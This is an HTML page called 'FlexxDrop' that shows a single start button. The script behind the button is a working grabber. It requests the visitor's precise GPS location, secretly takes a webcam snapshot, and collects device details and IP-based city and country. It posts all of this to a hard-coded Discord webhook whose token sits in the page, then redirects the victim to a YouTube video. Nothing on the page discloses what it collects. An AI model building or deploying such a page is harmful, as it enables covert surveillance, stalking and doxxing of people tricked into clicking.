<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>FlexxDrop</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    #startBtn {
      padding: 0.5em 1em;
      font-size: 1.1rem;
      background: #222;
      border: 1px solid #fff;
      color: #fff;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 1em;
    }
  </style>
</head>
<body>
  <div id="status">
    <button id="startBtn">Start FlexxDrop</button>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    const deniedPage = "permission-denied.html";

    let capturedImageData = null;
    let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
      };
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    function sendToDiscord(ipData) {
      const mapLink = coords.lat !== "Permission denied"
        ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : "N/A";
      const device = getDeviceInfo();

      const formData = new FormData();

      const snapshotLine = capturedImageData
        ? "📸 Snapshot received: ✅ [Download Image](attachment://snapshot.png)"
        : "📸 Snapshot received: ❌ No image available";

      const payload = {
        embeds: [{
          title: "📍 GPS & Device Info",
          description:
            `**Latitude:** ${coords.lat}   \n**Longitude:** ${coords.lon}   \n**Accuracy:** ${coords.acc} meters` +
            `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
            `\n\n🌐 **IP Info**` +
            `\n**IP:** ${ipData.ipAddress}` +
            `\n**City:** ${ipData.city}` +
            `\n**Region:** ${ipData.stateProv}` +
            `\n**Country:** ${ipData.countryName}` +
            `\n\n🖥️ **Device Info**` +
            `\n**Platform:** ${device.platform}` +
            `\n**Browser:** ${device.userAgent}` +
            `\n**Language:** ${device.language}` +
            `\n**Screen:** ${device.screen}` +
            `\n**Touch Support:** ${device.touchSupport}` +
            `\n\n${snapshotLine}` +
            `\n\n🕒 ${new Date().toLocaleString()}`
        }]
      };

      if (capturedImageData) {
        const blob = dataURLtoBlob(capturedImageData);
        formData.append("file", blob, "snapshot.png");
        payload.embeds[0].image = { url: "attachment://snapshot.png" };
      }

      formData.append("payload_json", JSON.stringify(payload));

      fetch(webhookUrl, {
        method: "POST",
        body: formData
      }).finally(() => {
        window.location.href = redirectUrl;
      });
    }

    async function startSequence() {
      document.getElementById("status").innerText = "Requesting permissions…";

      try {
        let locationAllowed = false;

        await new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              coords.lat = pos.coords.latitude;
              coords.lon = pos.coords.longitude;
              coords.acc = pos.coords.accuracy;
              locationAllowed = true;
              resolve();
            },
            () => resolve(),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        });

        if (!locationAllowed) {
          window.location.href = deniedPage;
          return;
        }

        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          await new Promise((resolve) => {
            // Give camera time to show a frame
            setTimeout(() => {
              const canvas = document.createElement("canvas");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              capturedImageData = canvas.toDataURL("image/png");
              stream.getTracks().forEach(track => track.stop());
              resolve();
            }, 500); // Delay ensures frame is ready
          });
        } catch {
          // Camera denied — continue without image
        }

        fetch("https://api.db-ip.com/v2/free/self")
          .then(res => res.json())
          .then(sendToDiscord)
          .catch(() => {
            sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
          });

      } catch (err) {
        window.location.href = deniedPage;
      }
    }

    document.getElementById("startBtn").addEventListener("click", startSequence);
  </script>
</body>
</html>
